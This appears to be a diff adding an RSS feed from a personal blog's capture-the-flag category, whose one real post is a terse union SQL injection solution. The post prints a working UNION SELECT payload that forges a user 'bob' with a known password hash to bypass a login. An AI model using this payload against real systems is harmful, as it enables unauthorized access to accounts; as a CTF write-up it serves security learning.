@@ -1,0 +1,50 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>ms ctf on Terminal</title>
+    <link>/categories/ms-ctf/</link>
+    <description>Recent content in ms ctf on Terminal</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Tue, 10 Jun 2025 17:16:34 +0300</lastBuildDate><atom:link href="/categories/ms-ctf/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title> Index</title>
+      <link>/posts/ms-ctf/</link>
+      <pubDate>Tue, 10 Jun 2025 17:16:34 +0300</pubDate>
+      
+      <guid>/posts/ms-ctf/</guid>
+      <description>title: &amp;ldquo;Ms Ctf&amp;rdquo; description: &amp;ldquo;Posts about Ms Ctf&amp;rdquo; Ms Ctf This section contains posts related to Ms Ctf.</description>
+      <content>&lt;hr&gt;
+&lt;h2 id=&#34;description-posts-about-ms-ctf&#34;&gt;title: &amp;ldquo;Ms Ctf&amp;rdquo;
+description: &amp;ldquo;Posts about Ms Ctf&amp;rdquo;&lt;/h2&gt;
+&lt;h1 id=&#34;ms-ctf&#34;&gt;Ms Ctf&lt;/h1&gt;
+&lt;p&gt;This section contains posts related to Ms Ctf.&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>Union Sql Injection</title>
+      <link>/posts/ms-ctf/union-sql-injection/</link>
+      <pubDate>Tue, 10 Jun 2025 17:16:34 +0300</pubDate>
+      
+      <guid>/posts/ms-ctf/union-sql-injection/</guid>
+      <description> section: &amp;ldquo;ms ctf&amp;rdquo; categories: [&amp;ldquo;ms ctf&amp;rdquo;] title: &amp;ldquo;Union Sql Injection&amp;rdquo; date: 2025-05-21 ![[Pasted image 20250521130606.png]]
+the solution ![[Pasted image 20250521130644.png]]
+the query run was
+&amp;#39; UNION SELECT 1, &amp;#39;bob&amp;#39;, &amp;#39;5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8&amp;#39;, &amp;#39;&amp;#39;-- password: password </description>
+      <content>&lt;hr&gt;
+&lt;h2 id=&#34;date-2025-05-21&#34;&gt;section: &amp;ldquo;ms ctf&amp;rdquo;
+categories: [&amp;ldquo;ms ctf&amp;rdquo;]
+title: &amp;ldquo;Union Sql Injection&amp;rdquo;
+date: 2025-05-21&lt;/h2&gt;
+&lt;p&gt;![[Pasted image 20250521130606.png]]&lt;/p&gt;
+&lt;p&gt;the solution
+![[Pasted image 20250521130644.png]]&lt;/p&gt;
+&lt;p&gt;the query run was&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; UNION SELECT 1, &amp;#39;&lt;/span&gt;bob&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;, &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;, &amp;#39;&amp;#39;--
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;password: password
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
+    </item>
+    
+  </channel>
+</rss>
